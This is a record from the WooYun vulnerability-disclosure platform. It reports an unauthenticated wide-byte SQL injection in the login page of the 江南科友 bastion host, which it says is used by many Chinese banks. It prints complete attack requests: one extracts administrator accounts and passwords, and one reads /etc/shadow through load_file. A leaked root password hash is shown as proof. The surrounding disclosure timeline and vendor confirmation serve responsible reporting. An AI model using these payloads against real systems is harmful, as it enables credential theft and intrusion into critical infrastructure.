{"id": 48597, "wybug_id": "wooyun-2014-077189", "wybug_title": "江南科友堡垒机全版本getshell（无需登录）", "wybug_corp": "江南科友", "wybug_author": "路人甲", "wybug_date": "2014-09-24 18:50", "wybug_open_date": "2014-12-23 18:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向公众公开  简要描述： 江南科友堡垒机高危漏洞，可获取webshell 详细说明：  客户详情请见这位兄弟的漏洞：\n WooYun: 江南科友堡垒机全版本getshell（无需登录） \n摘部分国内各大银行：中国银行、民生银行、广东发展银行、平安银行、深圳发展银行、浦发银行、渤海银行总行及各分行、中国工商银行、中国农业银行、中国建设银行、交通银行、招商银行、中信银行、兴业银行、华夏银行、中国邮政储蓄银行总行或部分分行该漏洞同样是宽字节注入...上面的兄弟发的是 username参数的注入，今天测试发现 account 参数同样存在该问题：如下：\nPOST /login.php HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 1xxxxContent-Length: 285Connection: Keep-AliveCache-Control: no-cacheCookie: PHPSESSID=8b5a4758ddce135bb0b74107a970045cpassword_check=1&account=aaaaaa%cf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))b)c)#&password=aaaa&usb_code=&randvalue=795327880\n提交：account=aaaaaa%cf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))b)c)#后，成功获取到管理员的帐号，密码，如图：\n\n获取/etc/shadow提交如下参数：account=aaa%cf'+and+1=2+union+select+1+from+(select+count(*),concat(floor(rand(0)*2),(Select concat(substring(load_file(0x2F6574632F736861646F77),1,64)) FROM manager limit 0,1))a+from+information_schema.tables+group+by+a)b#\n\n获取到上述信息后，可轻易获取到shell，这里就不演示了，直接给个截图：\n\n   漏洞证明：  root Hash:root:$1$nd7FWMB8$IW4Op2tuiXWxWDUhoEhSP/:13935:0:99999:7:::bin:shell:\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-28 11:31 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-25 17:17 |    \t\tcnbird \t\t\t( 普通白帽子  |\t\t\t        Rank:547 漏洞数:47        | http://blog.csdn.net/cnbird2008)\t\t \n  mark    \n     2014-09-29 11:06 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  比较关注全版本的结论是如何得出来的    \n     2014-12-23 20:30 |    \t\tDebug0man \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 叽叽呗呗...)\t\t \n  堡垒机的安全性确实影响比较大,不管是内网还是外网(毕竟用上堡垒机的企业不会安全意识那么淡薄放到公网).毕竟堡垒机有着承上启下,一夫当关万夫莫开的位置和作用.不过,既然说全版本,应该说明洞主具有较多的机会接触堡垒机巴...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}